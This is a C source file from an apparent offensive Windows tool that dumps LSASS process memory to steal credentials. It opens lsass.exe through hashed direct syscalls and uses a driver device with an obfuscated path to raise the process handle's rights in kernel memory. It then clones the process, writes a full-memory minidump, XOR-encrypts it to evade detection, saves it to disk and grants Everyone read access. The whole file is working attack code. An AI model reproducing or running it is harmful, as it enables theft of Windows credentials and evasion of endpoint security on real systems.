#include "dump.h"
#include "api.h"
#include "defs.h"
#include "engine.h"
#include "logger.h"
#include "memory.h"
#include "offsets.h"
#include "utils.h"
#include "nocrt.h"
#include <windows.h>

extern SYSCALL_LIST SyscallList;
extern void Fnc0000();

// ==================================
// DKOM Handle Elevation
// ==================================

#define PROCESS_ALL_ACCESS_VALUE 0x1FFFFF
#define ACCESS_MASK_ELEVATION 0x1FFFFF

DWORD64 ExpLookupHandleTableEntry(HANDLE Device, DWORD64 TableCode,
                                  DWORD64 Handle) {
  DWORD64 handleVal = Handle & 0xFFFFFFFFFFFFFFFCULL;
  DWORD tableLevel = (DWORD)(TableCode & 3);
  DWORD64 tableBase = TableCode & ~3ULL;

  if (tableLevel == 0) {
    return tableBase + (handleVal * 4);
  } else if (tableLevel == 1) {
    DWORD64 level1 = (handleVal >> 10) & 0x1FF;
    DWORD64 level2 = (handleVal >> 2) & 0xFF;
    DWORD64 ptr1 = ReadMemoryDWORD64(Device, tableBase + (level1 * 8));
    if (ptr1 == 0)
      return 0;
    return ptr1 + (level2 * 16);
  } else if (tableLevel == 2) {
    DWORD64 level1 = (handleVal >> 19) & 0x1FF;
    DWORD64 level2 = (handleVal >> 10) & 0x1FF;
    DWORD64 level3 = (handleVal >> 2) & 0xFF;
    DWORD64 ptr1 = ReadMemoryDWORD64(Device, tableBase + (level1 * 8));
    if (ptr1 == 0)
      return 0;
    DWORD64 ptr2 = ReadMemoryDWORD64(Device, ptr1 + (level2 * 8));
    if (ptr2 == 0)
      return 0;
    return ptr2 + (level3 * 16);
  }
  return 0;
}

void ElevateHandle(HANDLE Device, DWORD64 pHandleTableEntry) {
  DWORD64 highValueAddr = pHandleTableEntry + 0x8;
  DWORD64 currentHighValue = ReadMemoryDWORD64(Device, highValueAddr);

  log_info("Current HighValue at %p: 0x%llx", (void *)highValueAddr,
           currentHighValue);

  DWORD64 mask = 0x3FFFFFF;
  DWORD64 newHighValue = currentHighValue & ~mask;
  newHighValue |= (DWORD64)ACCESS_MASK_ELEVATION;

  WriteMemoryDWORD64(Device, highValueAddr, newHighValue);
  log_success(
      "DKOM: Handle elevated to PROCESS_ALL_ACCESS (New HighValue: 0x%llx)",
      newHighValue);
}

// ==================================
// Cloning LSASS
// ==================================

HANDLE CloneLsassProcess() {
  HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE)
    return NULL;

  PROCESSENTRY32W pe = {0};
  pe.dwSize = sizeof(PROCESSENTRY32W);
  DWORD lsassPid = 0;
  if (pP32F(hSnapshot, &pe)) {
    do {
      if (lstrcmpiW(pe.szExeFile, L"lsass.exe") == 0) {
        lsassPid = pe.th32ProcessID;
        break;
      }
    } while (pP32N(hSnapshot, &pe));
  }
  CloseHandle(hSnapshot);

  if (lsassPid == 0) {
    log_error("Failed to find lsass.exe PID");
    return NULL;
  }
  log_info("Found process: %ls (PID: %lu)", pe.szExeFile, lsassPid);

  // Use DKOM elevation
  HANDLE hLsass = NULL;
  OBJECT_ATTRIBUTES objAttr;
  CLIENT_ID clientId;

  InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
  clientId.UniqueProcess = (HANDLE)(ULONG_PTR)lsassPid;
  clientId.UniqueThread = 0;

  DWORD64 hNtOpenP = djb2((PBYTE) "NtOpenProcess");
  int idxOpenP = -1;
  for (DWORD i = 0; i < SyscallList.Count; i++) {
    if (SyscallList.Entries[i].dwHash == hNtOpenP) {
      idxOpenP = i;
      break;
    }
  }

  if (idxOpenP == -1) {
    log_error("NtOpenProcess syscall not found.");
    return NULL;
  }

  typedef NTSTATUS(NTAPI * fnNtOpenProcess)(PHANDLE, ACCESS_MASK,
                                            POBJECT_ATTRIBUTES, PCLIENT_ID);
  PBYTE pStubBase = (PBYTE)&Fnc0000;
  fnNtOpenProcess pNtOpenProcess =
      (fnNtOpenProcess)(pStubBase + (idxOpenP * 16));

  // 1. OPEN LSASS WITH HARMLESS PERMISSIONS
  NTSTATUS status =
      ExecuteSyscall(pNtOpenProcess, Mask_Worker, &hLsass,
                     PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);

  if (status != 0 || hLsass == NULL) {
    log_error("Failed to obtain low-privileged handle to LSASS. Status: 0x%X",
              status);
    return NULL;
  }
  log_info("Obtained harmless handle to LSASS (Handle: %p)", hLsass);

  // 2. ELEVATE HANDLE PRIVILEGES VIA DKOM
  log_info("Invoking driver to elevate handle permissions in the kernel...");

  const unsigned char dev_enc[] = {0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61,
                                   0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56};
  char *dev_path =
      xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);

  HANDLE Device = pCFA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                       OPEN_EXISTING, 0, NULL);
  custom_free(dev_path);

  if (Device == INVALID_HANDLE_VALUE) {
    log_error("Unable to obtain device handle for DKOM");
    CloseHandle(hLsass);
    return NULL;
  }

  DWORD64 myEproc = GetMyEprocAddress(Device);
  if (myEproc == 0) {
    log_error("Failed to locate own EPROCESS");
    CloseHandle(Device);
    CloseHandle(hLsass);
    return NULL;
  }

  log_info("EPROCESS located at: 0x%llx", myEproc);
  Offsets offs = getOffsets();
  DWORD64 handleTableAddr =
      ReadMemoryDWORD64(Device, myEproc + offs.ObjectTable);
  if (!handleTableAddr) {
    log_error("Failed to read ObjectTable pointer from EPROCESS");
    CloseHandle(Device);
    CloseHandle(hLsass);
    return NULL;
  }

  DWORD64 tableCode = ReadMemoryDWORD64(
      Device,
      handleTableAddr + 8); // TableCode is at offset 0x8 from _HANDLE_TABLE
  if (!tableCode) {
    log_error("Failed to read TableCode from HANDLE_TABLE");
    CloseHandle(Device);
    CloseHandle(hLsass);
    return NULL;
  }

  log_info("HandleTable: 0x%llx, TableCode: 0x%llx", handleTableAddr,
           tableCode);
  DWORD64 handleEntryAddr =
      ExpLookupHandleTableEntry(Device, tableCode, (DWORD64)hLsass);

  if (handleEntryAddr == 0) {
    log_error("Failed to lookup handle table entry");
    CloseHandle(Device);
    CloseHandle(hLsass);
    return NULL;
  }

  log_info("HandleTableEntry located at: 0x%llx", handleEntryAddr);

  // 3. OVERWRITE THE PERMISSIONS IN RING 0
  ElevateHandle(Device, handleEntryAddr);
  CloseHandle(Device);

  // 4. CLONE AND DUMP
  HANDLE hClone = NULL;

  DWORD64 hNtCPX = djb2((PBYTE) "NtCreateProcessEx");
  int idxNtCPX = -1;
  for (DWORD i = 0; i < SyscallList.Count; i++) {
    if (SyscallList.Entries[i].dwHash == hNtCPX) {
      idxNtCPX = i;
      break;
    }
  }

  if (idxNtCPX == -1) {
    log_error("NtCreateProcessEx syscall not found.");
    CloseHandle(hLsass);
    return NULL;
  }

  PFN_NTCPX pNtCreateProcessEx = (PFN_NTCPX)(pStubBase + (idxNtCPX * 16));

  status = ExecuteSyscall(pNtCreateProcessEx, Mask_Worker, &hClone,
                          PROCESS_ALL_ACCESS, &objAttr, hLsass, 0, NULL, NULL,
                          NULL, FALSE);

  CloseHandle(hLsass);

  if (status != 0) {
    log_error("ExecuteSyscall (NtCreateProcessEx) failed : 0x%X", status);
    return NULL;
  }

  log_success("Successfully cloned process, handle: 0x%p", hClone);
  return hClone;
}

// ==================================
// Dumping LSASS in memory
// ==================================

// Xoring LSASS
LPVOID dumpBuffer = NULL;
DWORD dumpSize = 0;

BOOL InitializeDumpBuffer() {
  dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                         1024 * 1024 * 200); // Dynamic allocation (200MB)
  if (dumpBuffer == NULL) {
    log_error("Failed to allocate memory for dump buffer");
    return FALSE;
  }
  return TRUE;
}

// Callback routine that we be called by the MiniDumpWriteDump function
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam,
                                  const PMINIDUMP_CALLBACK_INPUT CallbackInput,
                                  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
  LPVOID destination = 0;
  LPVOID source = 0;
  DWORD bufferSize = 0;
  switch (CallbackInput->CallbackType) {
  case IoStartCallback:
    CallbackOutput->Status = S_FALSE;
    log_info("Starting dump to memory buffer");
    break;
  case IoWriteAllCallback:
    // Buffer holding the current chunk of dump data
    source = CallbackInput->Io.Buffer;

    // Calculate the memory address we need to copy the chunk of dump data to
    // based on the current dump data offset
    destination =
        (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);

    // Size of the current chunk of dump data
    bufferSize = CallbackInput->Io.BufferBytes;

    // Copy the chunk data to the appropriate memory address of our allocated
    // buffer
    RtlCopyMemory(destination, source, bufferSize);
    dumpSize += bufferSize; // Incremeant the total size of the dump with the
                            // current chunk size

    // printf("[+] Copied %i bytes to memory buffer\n", bufferSize);

    CallbackOutput->Status = S_OK;
    break;
  case IoFinishCallback:
    CallbackOutput->Status = S_OK;
    log_success("Copied %i bytes to memory buffer", dumpSize);
    break;
  }
  return TRUE;
}

BOOL DumpAndXorLsass(const char *outPath, const char *key, size_t key_len) {
  HANDLE hClone = CloneLsassProcess();
  if (!hClone) {
    log_error("Failed to clone.");
    return FALSE;
  }

  DWORD clonedPID = pGPID(hClone);
  if (!clonedPID) {
    log_error("Failed to GetProcessId.");
    return FALSE;
  }

  if (!InitializeDumpBuffer()) {
    log_error("Failed to InitializeDumpBuffer.");
    return FALSE;
  }

  // Callback configuration
  MINIDUMP_CALLBACK_INFORMATION mci;
  mci.CallbackRoutine = DumpCallbackRoutine;
  mci.CallbackParam = (PVOID)key; // key passed as parameter

  // Dump
  BOOL dumped =
      pMDWD(hClone, clonedPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &mci);

  if (!dumped) {
    log_error("Dump failed. Error: %lu", GetLastError());
    HeapFree(GetProcessHeap(), 0, dumpBuffer);
    return FALSE;
  }

  // Xoring the buffer
  xor_buffer(dumpBuffer, dumpSize, key, key_len);

  // Create file on disk
  HANDLE dumpFile = pCFA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
  if (dumpFile == INVALID_HANDLE_VALUE) {
    log_error("Failed to create output file. Error: %lu", GetLastError());
    HeapFree(GetProcessHeap(), 0, dumpBuffer);
    return FALSE;
  }

  // Write buffer on file
  DWORD bytesWritten = 0;
  BOOL writeSuccess =
      WriteFile(dumpFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
  CloseHandle(dumpFile);

  if (!writeSuccess || bytesWritten != dumpSize) {
    log_error("Failed to write XORed dump to file. Error: %lu", GetLastError());
    HeapFree(GetProcessHeap(), 0, dumpBuffer);
    return FALSE;
  }

  log_success("XOR'd dump written to %s successfully", outPath);

  HeapFree(GetProcessHeap(), 0, dumpBuffer);
  dumpBuffer = NULL;
  dumpSize = 0;

  return TRUE;
}

// ==================================
// Set read access for everyone
// ==================================

BOOL SetFileGenericReadAccess(const char *filePath) {
  EXPLICIT_ACCESS_A ea = {0};
  PACL pNewDACL = NULL;

  ea.grfAccessPermissions = GENERIC_READ;
  ea.grfAccessMode = SET_ACCESS;
  ea.grfInheritance = NO_INHERITANCE;
  ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
  ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
  ea.Trustee.ptstrName = (LPSTR)"Everyone";

  DWORD dwRes = SetEntriesInAclA(1, &ea, NULL, &pNewDACL);
  if (dwRes != ERROR_SUCCESS)
    return FALSE;

  dwRes = SetNamedSecurityInfoA((LPSTR)filePath, SE_FILE_OBJECT,
                                DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL,
                                NULL);

  if (pNewDACL)
    LocalFree(pNewDACL);

  return dwRes == ERROR_SUCCESS;
}
